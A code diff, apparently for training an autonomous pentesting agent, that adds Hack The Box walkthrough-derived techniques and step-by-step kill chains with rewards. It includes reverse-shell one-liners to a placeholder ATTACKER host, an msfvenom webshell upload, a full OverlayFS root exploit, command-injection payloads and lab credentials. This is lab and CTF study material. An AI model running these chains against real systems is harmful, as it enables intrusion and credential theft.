@@ -1068,6 +1068,28 @@ HTB_COMMON_PATTERNS = {
              "reasoning": "Local File Inclusion can read source code AND achieve RCE via log poisoning."},
             {"name": "Command Injection", "commands": ["; id", "| id", "$(id)", "`id`"],
              "reasoning": "Unsanitized input passed to shell commands. Test with different separators."},
+            {"name": "CMS Default Creds → Admin → Shell",
+             "commands": ["Dolibarr admin:admin", "WordPress admin:admin", "Tomcat tomcat:tomcat"],
+             "reasoning": "Many CMS/admin panels ship with default credentials. ALWAYS try admin:admin, "
+                          "admin:password, etc BEFORE brute-forcing. (Source: BoardLight, Bizness walkthroughs)"},
+            {"name": "IDOR → Data Leak → Credentials",
+             "commands": ["curl http://target/data/0", "burp intruder sequential IDs"],
+             "reasoning": "Insecure Direct Object Reference on sequential IDs. Change /data/5 to /data/0 "
+                          "to access other users' data. PCAP files may contain cleartext FTP/HTTP creds. "
+                          "(Source: Cap walkthrough — nathan:Buck3tH4TF0RM3! leaked via PCAP IDOR)"},
+            {"name": "SSRF → Internal Service Access",
+             "commands": ["Request Baskets SSRF", "curl -X POST proxy_endpoint"],
+             "reasoning": "Server-Side Request Forgery proxies through the target to reach filtered/internal "
+                          "ports. If nmap shows filtered ports, look for SSRF-capable web apps to reach them. "
+                          "(Source: Sau walkthrough — SSRF via Request Baskets to reach filtered Maltrail)"},
+            {"name": "API Command Injection",
+             "commands": ["curl -X POST .../api/endpoint -d '{\"param\":\"test;id;\"}'"],
+             "reasoning": "API endpoints that generate files/configs often pass user input to exec/system. "
+                          "Inject shell commands via semicolons. (Source: TwoMillion — VPN generation API)"},
+            {"name": "js2py Sandbox Escape → RCE",
+             "commands": ["CVE-2024-28397 payload", "python js2py eval_js bypass"],
+             "reasoning": "Flask apps using js2py to eval user JavaScript are vulnerable to sandbox escape. "
+                          "Navigate Python MRO to find subprocess.Popen. (Source: CodePartTwo walkthrough)"},
         ],
     },
     "linux_privesc": {
@@ -1076,19 +1098,49 @@ HTB_COMMON_PATTERNS = {
                      "The agent must learn to enumerate ALL paths before attempting any single one.",
         "techniques": [
             {"name": "SUID binaries", "commands": ["find / -perm -4000 -type f 2>/dev/null"],
-             "reasoning": "SUID binaries run as their owner (often root). GTFOBins lists exploitable ones."},
+             "reasoning": "SUID binaries run as their owner (often root). GTFOBins lists exploitable ones. "
+                          "(Source: BoardLight — CVE-2022-37706 enlightenment SUID exploit)"},
             {"name": "sudo -l misconfiguration", "commands": ["sudo -l"],
-             "reasoning": "Users may have sudo for specific commands that can be abused for shell escape."},
+             "reasoning": "Users may have sudo for specific commands that can be abused for shell escape. "
+                          "(Source: Bashed — sudo scriptmanager NOPASSWD; Sau — sudo systemctl pager !sh)"},
             {"name": "Kernel exploits", "commands": ["uname -r", "linux-exploit-suggester"],
-             "reasoning": "Old kernels have known exploits. Check version, then search for matching CVE."},
+             "reasoning": "Old kernels have known exploits. Check version, then search for matching CVE. "
+                          "(Source: Devel/Active — MS11-046; Analytics — CVE-2023-2640 OverlayFS; "
+                          "TwoMillion — CVE-2023-0386 OverlayFS/FUSE)"},
             {"name": "Cron jobs", "commands": ["cat /etc/crontab", "ls -la /var/spool/cron/", "pspy64"],
-             "reasoning": "Cron jobs running as root with writable scripts = easy root. Use pspy to find them."},
+             "reasoning": "Cron jobs running as root with writable scripts = easy root. Use pspy to find them. "
+                          "(Source: Bashed — /scripts/test.py ran as root, replaced with reverse shell)"},
             {"name": "Writable /etc/passwd", "commands": ["ls -la /etc/passwd"],
              "reasoning": "If /etc/passwd is writable, add a root-equivalent user with known password hash."},
             {"name": "Capabilities", "commands": ["getcap -r / 2>/dev/null"],
-             "reasoning": "Linux capabilities grant specific root powers. cap_setuid on python3 = instant root."},
+             "reasoning": "Linux capabilities grant specific root powers. cap_setuid on python3 = instant root. "
+                          "(Source: Cap walkthrough — python3.8 had cap_setuid → os.setuid(0) → root)"},
             {"name": "Docker group", "commands": ["id", "docker run -v /:/host -it alpine chroot /host sh"],
              "reasoning": "Docker group membership = root. Mount host filesystem into container."},
+            {"name": "Tmux/Screen session hijacking",
+             "commands": ["tmux ls", "tmux -S /path/to/socket attach", "screen -ls"],
+             "reasoning": "Root tmux/screen sessions left running can be attached to for instant root. "
+                          "(Source: Valentine — /.devs/dev_sess tmux socket ran as root → attach → root)"},
+            {"name": "GTFOBins sudo abuse",
+             "commands": ["sudo wget --use-askpass", "sudo systemctl → !sh pager escape"],
+             "reasoning": "Many binaries with sudo can spawn shells. wget with --use-askpass reads arbitrary "
+                          "files as root. systemctl's pager allows !sh escape. (Source: Sunday — wget; Sau — systemctl)"},
+            {"name": "Shadow backup files",
+             "commands": ["find / -name '*shadow*' 2>/dev/null", "cat /backup/shadow.backup"],
+             "reasoning": "Backup copies of /etc/shadow may exist with weaker permissions. "
+                          "(Source: Sunday — /backup/shadow.backup readable, cracked with john)"},
+            {"name": "Environment variable credential leaks",
+             "commands": ["env", "cat /proc/*/environ 2>/dev/null", "export"],
+             "reasoning": "Container/application environments often store passwords in env vars. "
+                          "(Source: Analytics — META_PASS in env vars leaked SSH creds)"},
+            {"name": "OverlayFS kernel privesc",
+             "commands": ["CVE-2023-2640", "CVE-2023-32629", "CVE-2023-0386"],
+             "reasoning": "Ubuntu 22.04 kernels 5.15-6.2 vulnerable to OverlayFS privesc. Single-command "
+                          "exploit gives instant root. (Source: Analytics, TwoMillion walkthroughs)"},
+            {"name": "npbackup/backup tool abuse",
+             "commands": ["sudo npbackup-cli -c custom_config -b", "modify backup paths"],
+             "reasoning": "Backup tools running as root with configurable paths can backup /root. "
+                          "(Source: CodePartTwo — npbackup-cli ran as sudo, modified config to backup /root)"},
         ],
     },
     "windows_privesc": {
@@ -1103,9 +1155,90 @@ HTB_COMMON_PATTERNS = {
             {"name": "AlwaysInstallElevated", "commands": ["reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"],
              "reasoning": "If enabled, any user can install MSI packages as SYSTEM."},
             {"name": "Kerberoasting", "commands": ["GetUserSPNs.py", "hashcat -m 13100"],
-             "reasoning": "Request TGS tickets for service accounts, crack offline. AD-specific but common."},
+             "reasoning": "Request TGS tickets for service accounts, crack offline. AD-specific but common. "
+                          "(Source: Active walkthrough — SVC_TGS Kerberoasted → Administrator hash)"},
             {"name": "BloodHound", "commands": ["bloodhound-python -c all -d domain.htb"],
              "reasoning": "Maps Active Directory attack paths. Essential for AD-joined HTB boxes."},
+            {"name": "GPP Credential Extraction",
+             "commands": ["smbclient //target/Replication", "gpp-decrypt", "Groups.xml"],
+             "reasoning": "Group Policy Preferences store encrypted passwords in SYSVOL XML files. "
+                          "Microsoft published the AES key, so ALL GPP passwords are trivially decryptable. "
+                          "(Source: Active walkthrough — GPP cPassword in Groups.xml → active.htb\\SVC_TGS)"},
+            {"name": "Kernel exploits (Windows)",
+             "commands": ["systeminfo", "windows-exploit-suggester", "MS11-046"],
+             "reasoning": "Old Windows builds have reliable kernel exploits. Win7 Build 7600 → MS11-046 "
+                          "for instant SYSTEM. (Source: Devel — Win7 x86 → afd.sys exploit → SYSTEM)"},
+        ],
+    },
+    "credential_hunting": {
+        "description": "Techniques for finding credentials post-initial-access",
+        "reasoning": "Credentials are the currency of lateral movement. Every walkthrough shows that "
+                     "finding and reusing credentials is THE key skill in pentesting. Password reuse "
+                     "across services is extremely common — SSH password = web app password = DB password.",
+        "techniques": [
+            {"name": "Web app config files", "commands": ["find / -name 'config.php' -o -name '.env'", "cat wp-config.php"],
+             "reasoning": "Web applications store DB credentials in config files. These often reuse the "
+                          "same password as the system user. (Source: BoardLight — conf.php had DB creds → SSH)"},
+            {"name": "SQLite/Derby database files",
+             "commands": ["find / -name '*.db' -o -name '*.sqlite3'", "sqlite3 db 'SELECT * FROM user'"],
+             "reasoning": "Application databases contain user hashes. Extract and crack them. "
+                          "(Source: CodePartTwo — SQLite user table had MD5 hashes; Bizness — Derby .dat files)"},
+            {"name": "PCAP/network capture analysis",
+             "commands": ["tcpdump -r capture.pcap", "tshark -r file.pcap -Y ftp"],
+             "reasoning": "Network captures may contain cleartext credentials from FTP, HTTP, Telnet. "
+                          "(Source: Cap — PCAP contained FTP credentials in cleartext)"},
+            {"name": "Environment variables",
+             "commands": ["env", "cat /proc/*/environ", "printenv"],
+             "reasoning": "Container environments leak credentials as env vars. "
+                          "(Source: Analytics — META_PASS env var → SSH password)"},
+            {"name": ".env files and dotfiles",
+             "commands": ["find / -name '.env' 2>/dev/null", "cat .env"],
+             "reasoning": "Applications store secrets in .env files. "
+                          "(Source: TwoMillion — .env contained DB_PASSWORD=SuperDuperPass123 → SSH)"},
+            {"name": "Hex-encoded keys and encoded secrets",
+             "commands": ["cat hype_key | xxd -r -p > key.pem"],
+             "reasoning": "Secrets may be hex-encoded, base64-encoded, or otherwise obfuscated. "
+                          "(Source: Valentine — hex-encoded RSA private key in /dev/hype_key)"},
+            {"name": "Hash extraction from DB data files",
+             "commands": ["grep -r 'password\\|hash\\|crypt' /opt/*/data/"],
+             "reasoning": "Application runtime data may contain password hashes in raw data files. "
+                          "(Source: Bizness — Derby .dat files contained SHA1 admin password hash)"},
+        ],
+    },
+    "service_specific_attacks": {
+        "description": "Attacks targeting specific commonly-seen services from HTB walkthroughs",
+        "reasoning": "Each service version has specific known vulnerabilities. The agent should learn "
+                     "to match service+version to the correct exploit automatically.",
+        "techniques": [
+            {"name": "Metabase CVE-2023-38646", "commands": ["/api/setup/validate", "setup-token extraction"],
+             "reasoning": "Pre-auth RCE via setup-token leak. GET /api/session/properties reveals token, "
+                          "then POST /api/setup/validate with JDBC H2 payload. (Source: Analytics)"},
+            {"name": "Dolibarr CVE-2023-30253", "commands": ["exploit.py http://crm.target admin admin LHOST LPORT"],
+             "reasoning": "PHP code injection in Dolibarr 17.0.0 CRM. Default creds admin:admin common. "
+                          "(Source: BoardLight)"},
+            {"name": "Apache OFBiz CVE-2023-49070", "commands": ["XML-RPC deserialization"],
+             "reasoning": "Pre-auth RCE via XML-RPC deserialization in Apache OFBiz ≤18.12. "
+                          "(Source: Bizness)"},
+            {"name": "Request Baskets CVE-2023-27163", "commands": ["SSRF via basket forwarding"],
+             "reasoning": "SSRF in Request Baskets ≤1.2.1 allows forwarding requests to internal services. "
+                          "Use to reach filtered ports. (Source: Sau)"},
+            {"name": "Maltrail v0.53 OS Command Injection", "commands": ["curl -d 'username=;cmd' /login"],
+             "reasoning": "Unauthenticated command injection on login endpoint. "
+                          "(Source: Sau — reached via SSRF)"},
+            {"name": "Heartbleed CVE-2014-0160", "commands": ["nmap --script ssl-heartbleed", "heartbleed.py"],
+             "reasoning": "Leaks server memory (64KB chunks) containing passwords, session tokens, keys. "
+                          "(Source: Valentine — leaked base64 password from memory)"},
+            {"name": "ProFTPD mod_copy CVE-2015-3306", "commands": ["SITE CPFR /etc/passwd", "SITE CPTO /var/www/"],
+             "reasoning": "Unauthenticated file copy — copy PHP shell to webroot for RCE. "
+                          "(Source: MS3 common, also HTB pattern)"},
+            {"name": "FTP Anonymous + Webroot Overlap",
+             "commands": ["ftp anonymous@target → put shell.aspx → curl http://target/shell.aspx"],
+             "reasoning": "When FTP anonymous write maps to web server root, upload webshell via FTP "
+                          "and trigger via HTTP. (Source: Devel — FTP to IIS webroot → ASPX shell)"},
+            {"name": "Finger Service User Enumeration",
+             "commands": ["finger @target", "finger root@target", "finger admin@target"],
+             "reasoning": "Legacy finger service (port 79) reveals valid usernames. Feed into SSH brute. "
+                          "(Source: Sunday — finger revealed sunny and sammy users)"},
         ],
     },
     "common_tools": {
@@ -1116,6 +1249,8 @@ HTB_COMMON_PATTERNS = {
         "privesc": ["linpeas.sh", "winpeas.exe", "linux-exploit-suggester", "PowerUp.ps1"],
         "transfer": ["python3 -m http.server", "certutil -urlcache", "wget", "curl"],
         "shell_upgrade": ["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "script /dev/null -c bash"],
+        "hash_cracking": ["hashcat", "john", "CrackStation (online)"],
+        "network_analysis": ["wireshark", "tshark", "tcpdump"],
     },
 }
 
@@ -1378,12 +1513,603 @@ HTB_KILL_CHAINS: List[KillChain] = [
                           "uid=33(www-data)", "uid="),
         ),
     ),
+    # ─── HTB Walkthrough-Derived Kill Chains (Phase 7.0) ────────────────
+    KillChain(
+        name="htb_idor_pcap_creds",
+        description="IDOR → PCAP download → cleartext FTP creds → SSH → Linux capabilities → root (Cap)",
+        target_profile="generic",
+        difficulty="easy",
+        reasoning="IDOR on sequential identifiers is extremely common. When you find /data/5, try /data/0. "
+                  "PCAP files from packet captures contain cleartext credentials from FTP/HTTP/Telnet. "
+                  "Linux capabilities (especially cap_setuid on python) give instant root without needing SUID.",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p 21,22,80 {target}", "Scan for FTP, SSH, HTTP",
+                          "Look for combination of FTP+SSH+HTTP which suggests credential reuse potential.",
+                          "21/tcp open ftp... 22/tcp open ssh... 80/tcp open http", "open"),
+            KillChainStep("enumeration", "curl http://{target}/data/0",
+                          "IDOR: Access other users' data by changing sequential ID to 0",
+                          "Web apps using sequential IDs are vulnerable to IDOR. Always try ID=0 for "
+                          "the first/admin capture. Download the PCAP file.",
+                          "0.pcap", "pcap"),
+            KillChainStep("exploitation", "tshark -r 0.pcap -Y 'ftp.request.command == USER || ftp.request.command == PASS'",
+                          "Extract FTP credentials from PCAP",
+                          "FTP transmits credentials in cleartext. tshark/Wireshark can filter FTP auth traffic.",
+                          "USER nathan... PASS Buck3tH4TF0RM3!", "PASS"),
+            KillChainStep("exploitation", "ssh nathan@{target}",
+                          "SSH with leaked FTP credentials (password reuse)",
+                          "Credential reuse is the #1 lateral movement technique. FTP password often = SSH password.",
+                          "nathan@target:~$", "nathan@"),
+            KillChainStep("privilege_escalation", "getcap -r / 2>/dev/null",
+                          "Enumerate Linux capabilities for privesc",
+                          "Linux capabilities are often overlooked. cap_setuid on python = instant root.",
+                          "/usr/bin/python3.8 = cap_setuid", "cap_setuid"),
+            KillChainStep("privilege_escalation",
+                          "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+                          "Exploit python3 cap_setuid for root",
+                          "Python with cap_setuid can call os.setuid(0) then spawn root shell.",
+                          "root@target:#", "root"),
+        ),
+    ),
+    KillChain(
+        name="htb_ssrf_to_rce",
+        description="SSRF → filtered internal service → command injection → pager privesc (Sau)",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="When nmap shows filtered ports, look for SSRF-capable web apps to reach internal "
+                  "services. Chain: SSRF proxies to filtered port → find vuln in internal service → "
+                  "RCE → shell → sudo binary with pager escape for root.",
+        total_expected_reward=400.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port scan — note filtered ports",
+                          "CRITICAL: Note ports marked 'filtered'. These are reachable internally. "
+                          "If you find an SSRF, you can reach filtered services through the target itself.",
+                          "55555/tcp open http... 80/tcp filtered... 8338/tcp filtered", "filtered"),
+            KillChainStep("enumeration", "curl -s http://{target}:55555/",
+                          "Identify web app on open port (Request Baskets, etc.)",
+                          "Check for SSRF-capable applications: proxy services, webhooks, baskets, etc.",
+                          "Request Baskets", "Request"),
+            KillChainStep("exploitation",
+                          "Create basket with forward_url=http://127.0.0.1:80 proxy_response=true",
+                          "Configure SSRF proxy to reach filtered internal port",
+                          "Create a basket/webhook that forwards requests to the filtered port via localhost.",
+                          "Basket created", "created"),
+            KillChainStep("exploitation",
+                          "curl -d 'username=;bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"' http://{target}:55555/BASKET/login",
+                          "Command injection on internal service via SSRF",
+                          "The internal service (Maltrail) has unauthenticated OS command injection on /login.",
+                          "Connection received", "shell"),
+            KillChainStep("privilege_escalation", "sudo -l",
+                          "Check sudo permissions",
+                          "Always check sudo -l. systemctl, journalctl, less, more — all have pager escapes.",
+                          "(root) NOPASSWD: /usr/bin/systemctl", "systemctl"),
+            KillChainStep("privilege_escalation", "sudo /usr/bin/systemctl status anything → !sh",
+                          "Abuse systemctl pager for root shell",
+                          "systemctl uses a pager (less) by default. In less, type !sh to spawn a shell. "
+                          "Since systemctl runs as root, the spawned shell is root.",
+                          "root@target:#", "root"),
+        ),
+    ),
+    KillChain(
+        name="htb_ftp_webroot_webshell",
+        description="FTP anonymous upload → webshell in IIS/Apache webroot → kernel privesc (Devel)",
+        target_profile="generic",
+        difficulty="easy",
+        reasoning="When FTP anonymous write is enabled AND the FTP root overlaps with the web server "
+                  "document root, you can upload a webshell via FTP and trigger it via HTTP. This is "
+                  "a classic technique that works on both IIS (ASPX) and Apache (PHP).",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p 21,80 {target}", "Scan for FTP + HTTP combo",
+                          "FTP + HTTP on the same host = potential webroot overlap. Check for anonymous FTP.",
+                          "21/tcp open ftp... 80/tcp open http... Anonymous FTP login allowed", "Anonymous"),
+            KillChainStep("enumeration", "ftp {target} → ls",
+                          "Check FTP contents — look for web files (iisstart.htm, index.html, etc.)",
+                          "If FTP root contains web files, FTP root = web root. Upload = instant webshell.",
+                          "iisstart.htm welcome.png", "iisstart"),
+            KillChainStep("exploitation",
+                          "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f aspx > shell.aspx && "
+                          "ftp {target} → put shell.aspx",
+                          "Generate and upload ASPX reverse shell via FTP",
+                          "For IIS use ASPX, for Apache use PHP. Upload via FTP anonymous write.",
+                          "226 Transfer complete", "Transfer complete"),
+            KillChainStep("exploitation", "curl http://{target}/shell.aspx",
+                          "Trigger webshell via HTTP to get reverse shell",
+                          "Access the uploaded file via web server to trigger code execution.",
+                          "Connection received... iis apppool\\web", "apppool"),
+            KillChainStep("privilege_escalation", "systeminfo → MS11-046 or MS10-059",
+                          "Windows kernel exploit for SYSTEM",
+                          "IIS app pool user → check systeminfo for OS build → find matching kernel exploit. "
+                          "Win7 Build 7600 = MS11-046 (afd.sys). Win2008 = MS10-059.",
+                          "nt authority\\system", "system"),
+        ),
+    ),
+    KillChain(
+        name="htb_heartbleed_key_recovery",
+        description="Heartbleed memory leak → password → encrypted RSA key → SSH → tmux root (Valentine)",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="Heartbleed (CVE-2014-0160) leaks 64KB chunks of server memory. This can contain "
+                  "passwords, session tokens, and encryption keys. Combine leaked password with "
+                  "discovered encrypted private key for SSH access.",
+        total_expected_reward=400.0,
+        steps=(
+            KillChainStep("recon", "nmap --script ssl-heartbleed -p 443 {target}", "Test for Heartbleed",
+                          "Heartbleed affects OpenSSL 1.0.1 through 1.0.1f. Nmap has a detection script.",
+                          "VULNERABLE: Heartbleed", "VULNERABLE"),
+            KillChainStep("enumeration", "gobuster dir -u https://{target} -w /usr/share/seclists/Discovery/Web-Content/common.txt -k",
+                          "Enumerate web directories for hidden files",
+                          "Look for /dev, /secret, /keys, /backup directories containing sensitive files.",
+                          "/dev/", "/dev"),
+            KillChainStep("exploitation", "python3 heartbleed.py {target} -n 100",
+                          "Exploit Heartbleed — dump 100 memory chunks",
+                          "Run Heartbleed exploit multiple times. Each dump is different. Look for "
+                          "base64-encoded strings, passwords, session cookies in leaked memory.",
+                          "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBl", "base64"),
+            KillChainStep("exploitation",
+                          "cat /dev/hype_key | xxd -r -p > hype.key && chmod 600 hype.key && "
+                          "openssl rsa -in hype.key -out decrypted.key -passin pass:LEAKED_PASSWORD",
+                          "Decrypt hex-encoded RSA key with leaked password",
+                          "The key file was hex-encoded. xxd -r -p converts hex to binary. Then decrypt "
+                          "the password-protected key using the password leaked from Heartbleed memory.",
+                          "writing RSA key", "RSA key"),
+            KillChainStep("exploitation", "ssh -i decrypted.key hype@{target}",
+                          "SSH login with decrypted private key",
+                          "Use the recovered private key for SSH authentication.",
+                          "hype@Valentine:~$", "hype@"),
+            KillChainStep("privilege_escalation", "tmux -S /.devs/dev_sess",
+                          "Attach to root tmux session",
+                          "Look for running tmux/screen sessions. Root sessions can be attached to if "
+                          "the socket file is world-readable. This gives instant root without any exploit.",
+                          "root@Valentine:#", "root@"),
+        ),
+    ),
+    KillChain(
+        name="htb_cron_job_abuse",
+        description="Web shell discovery → sudo user pivot → writable cron script → root (Bashed)",
+        target_profile="generic",
+        difficulty="easy",
+        reasoning="Directory enumeration finds existing webshells or dev tools. Sudo -l reveals users "
+                  "that can be impersonated. Writable cron scripts running as root = root by replacing "
+                  "the script content with a reverse shell.",
+        total_expected_reward=300.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -p 80 {target}", "Scan for web services",
+                          "Single-port web boxes often have hidden tools in web directories.",
+                          "80/tcp open http Apache httpd", "Apache"),
+            KillChainStep("enumeration", "gobuster dir -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
+                          "Directory brute-force — look for /dev, /cgi-bin, /scripts",
+                          "Dev directories may contain debugging tools, phpbash, webshells, or admin panels.",
+                          "/dev/", "/dev"),
+            KillChainStep("exploitation", "curl http://{target}/dev/phpbash.php",
+                          "Access discovered web shell or dev tool",
+                          "phpbash.php is a PHP-based interactive shell. Other common finds: adminer.php, "
+                          "shell.php, cmd.php. Any web-accessible script gives initial foothold.",
+                          "www-data@target:$", "www-data"),
+            KillChainStep("privilege_escalation", "sudo -l → sudo -u scriptmanager /bin/bash",
+                          "Pivot to user with write access to cron scripts",
+                          "sudo -l may reveal another user with NOPASSWD access. Pivot to that user.",
+                          "scriptmanager@target:$", "scriptmanager"),
+            KillChainStep("privilege_escalation",
+                          "echo 'import os; os.system(\"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\")' > /scripts/test.py",
+                          "Replace cron script with reverse shell",
+                          "Scripts in /scripts/ running as root cron can be replaced. Wait for cron execution.",
+                          "Connection received... root@target", "root"),
+        ),
+    ),
+    KillChain(
+        name="htb_subdomain_cms_exploit",
+        description="Subdomain fuzzing → CMS default creds → CVE exploit → config cred leak → SSH → SUID (BoardLight)",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="When the main site has nothing exploitable, fuzz for subdomains. CMS platforms "
+                  "often have default credentials. After initial shell, web app config files contain "
+                  "database credentials that are reused for SSH.",
+        total_expected_reward=400.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p 22,80 {target}", "Scan for SSH and HTTP",
+                          "Only SSH + HTTP means the attack path is through the web.",
+                          "22/tcp open ssh... 80/tcp open http", "open"),
+            KillChainStep("enumeration",
+                          "ffuf -u http://{target} -H 'Host: FUZZ.board.htb' "
+                          "-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs DEFAULT_SIZE",
+                          "Fuzz for virtual host subdomains",
+                          "Check page source for email/domain hints. Use ffuf with Host header fuzzing.",
+                          "crm [Status: 200]", "crm"),
+            KillChainStep("exploitation", "Login with default credentials admin:admin",
+                          "Try default CMS credentials",
+                          "Dolibarr, WordPress, phpMyAdmin — ALWAYS try admin:admin, admin:password first.",
+                          "Login successful", "success"),
+            KillChainStep("exploitation", "python3 exploit.py http://crm.target admin admin LHOST LPORT",
+                          "Exploit CMS vulnerability (CVE-2023-30253 Dolibarr PHP injection)",
+                          "After identifying CMS version, search for CVE exploits. Run with credentials.",
+                          "www-data shell", "www-data"),
+            KillChainStep("privilege_escalation",
+                          "cat /var/www/html/conf/conf.php → extract DB credentials",
+                          "Extract credentials from web app config files",
+                          "Web apps store DB creds in config files. These are often reused for SSH.",
+                          "dolibarrowner:serverfun2$2023!!", "pass"),
+            KillChainStep("privilege_escalation", "ssh larissa@{target} (with DB password)",
+                          "SSH with reused config file credentials",
+                          "Password reuse from web app config → SSH is extremely common.",
+                          "larissa@BoardLight:~$", "larissa@"),
+            KillChainStep("privilege_escalation",
+                          "find / -perm -4000 2>/dev/null → enlightenment SUID → CVE-2022-37706",
+                          "Exploit SUID binary for root",
+                          "Enumerate SUID binaries. Research unknown ones for CVEs.",
+                          "root@BoardLight:#", "root"),
+        ),
+    ),
+    KillChain(
+        name="htb_api_injection_env_creds",
+        description="API enumeration → command injection → .env credential leak → SSH → kernel privesc (TwoMillion)",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="Modern web apps expose APIs. Enumerate all API endpoints, check for auth bypass, "
+                  "and test each parameter for command injection. .env files often contain reused passwords.",
+        total_expected_reward=450.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p 22,80 {target}", "Scan for SSH and HTTP",
+                          "Web + SSH is the standard HTB combination.",
+                          "22/tcp open ssh... 80/tcp open http nginx", "open"),
+            KillChainStep("enumeration", "curl -s http://{target}/api/v1 | jq",
+                          "Enumerate API endpoints",
+                          "Many web apps have undocumented API endpoints. Try /api, /api/v1, /api/docs.",
+                          "/api/v1/admin/vpn/generate", "api"),
+            KillChainStep("exploitation",
+                          "curl -X POST http://{target}/api/v1/admin/vpn/generate "
+                          "-d '{\"username\":\"test;id;\"}'",
+                          "Test API parameters for command injection",
+                          "API endpoints that generate files/configs often pass params to system commands. "
+                          "Test with ;id; to confirm command injection.",
+                          "uid=33(www-data)", "uid="),
+            KillChainStep("exploitation",
+                          "Inject reverse shell via command injection",
+                          "Upgrade command injection to reverse shell",
+                          "Use base64 encoding to avoid special character issues in JSON payload.",
+                          "www-data shell", "shell"),
+            KillChainStep("privilege_escalation", "cat .env",
+                          "Read .env file for database/application credentials",
+                          "Web app root directories contain .env files with DB_PASSWORD, API keys, etc.",
+                          "DB_PASSWORD=SuperDuperPass123", "PASS"),
+            KillChainStep("privilege_escalation", "ssh admin@{target} (with .env password)",
+                          "SSH with leaked .env credentials",
+                          "Password reuse: DB password = SSH password is extremely common.",
+                          "admin@target:~$", "admin@"),
+            KillChainStep("privilege_escalation", "uname -r → CVE-2023-0386 OverlayFS",
+                          "Kernel exploit for root (OverlayFS/FUSE)",
+                          "Ubuntu kernels 5.x-6.2 vulnerable to OverlayFS privesc. Check /var/mail for hints.",
+                          "root@target:#", "root"),
+        ),
+    ),
+    KillChain(
+        name="htb_metabase_rce_overlayfs",
+        description="Subdomain → Metabase CVE-2023-38646 → env var cred leak → SSH → OverlayFS root (Analytics)",
+        target_profile="generic",
+        difficulty="easy",
+        reasoning="Metabase pre-auth RCE via setup-token is a one-shot exploit. Container environments "
+                  "leak credentials via environment variables. OverlayFS is a single-command root exploit.",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -p 80 {target}", "Find HTTP redirecting to hostname",
+                          "Check for Host header redirects revealing domain names and subdomains.",
+                          "HTTP redirect to analytical.htb", "analytical"),
+            KillChainStep("enumeration",
+                          "ffuf -u http://analytical.htb -H 'Host: FUZZ.analytical.htb' -w subdomains.txt",
+                          "Fuzz for subdomains",
+                          "data.analytical.htb hosts Metabase — a business intelligence tool.",
+                          "data [Status: 200]", "data"),
+            KillChainStep("exploitation",
+                          "curl http://data.analytical.htb/api/session/properties → extract setup-token → "
+                          "POST /api/setup/validate with JDBC H2 payload",
+                          "Exploit Metabase CVE-2023-38646 pre-auth RCE",
+                          "Setup-token in /api/session/properties enables unauthenticated database setup. "
+                          "H2 database JDBC URL allows arbitrary command execution.",
+                          "shell as metabase", "shell"),
+            KillChainStep("privilege_escalation", "env | grep -i pass",
+                          "Extract credentials from container environment variables",
+                          "Docker containers store secrets as env vars. Look for META_PASS, DB_PASSWORD, etc.",
+                          "META_PASS=An4lytics_ds20223#", "PASS"),
+            KillChainStep("privilege_escalation", "ssh metalytics@{target} (with env password)",
+                          "SSH to host with leaked container credentials",
+                          "Container env var password often = host SSH password.",
+                          "metalytics@analytics:~$", "metalytics"),
+            KillChainStep("privilege_escalation",
+                          "unshare -rm sh -c 'mkdir l u w m && cp /u*/b*/p]/*sh l/ && "
+                          "mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && "
+                          "touch m/;mkdir -p m/..teleport/resolve && printf '#!/bin/sh\\ncp /bin/sh "
+                          "/var/tmp/xxsh\\nchmod 04755 /var/tmp/xxsh' >m/..teleport/resolve && "
+                          "chmod a+x m/..teleport/resolve && umount m' && /var/tmp/xxsh -p",
+                          "OverlayFS kernel exploit (CVE-2023-2640/CVE-2023-32629)",
+                          "Single-command OverlayFS exploit for Ubuntu 22.04 kernels 5.15-6.2.",
+                          "root@analytics:#", "root"),
+        ),
+    ),
+    KillChain(
+        name="htb_finger_shadow_crack",
+        description="Finger enumeration → SSH brute → shadow backup → hash crack → sudo wget root (Sunday)",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="Legacy services like finger (port 79) enumerate valid users. Shadow backup files "
+                  "with weak permissions expose password hashes. GTFOBins sudo abuse for root.",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -p 79,22022 {target}", "Scan for finger and SSH on non-standard ports",
+                          "Port 79 = finger (user enumeration). SSH may be on non-standard ports like 22022.",
+                          "79/tcp open finger... 22022/tcp open ssh", "finger"),
+            KillChainStep("enumeration", "finger @{target} && finger root@{target} && finger admin@{target}",
+                          "Enumerate valid usernames via finger service",
+                          "Finger reveals logged-in users and valid accounts. Build username list for brute force.",
+                          "sunny... sammy...", "sunny"),
+            KillChainStep("exploitation", "hydra -l sunny -P /usr/share/wordlists/rockyou.txt ssh://{target}:22022",
+                          "Brute force SSH with discovered usernames",
+                          "Use hydra with discovered usernames against SSH.",
+                          "sunny:sunday", "sunday"),
+            KillChainStep("privilege_escalation", "cat /backup/shadow.backup",
+                          "Read shadow backup file with weak permissions",
+                          "Backup copies of /etc/shadow may have weaker permissions than the original.",
+                          "sammy:$6$...", "sammy"),
+            KillChainStep("privilege_escalation", "john --wordlist=rockyou.txt shadow.backup",
+                          "Crack shadow hashes offline",
+                          "John the Ripper with rockyou.txt cracks weak passwords quickly.",
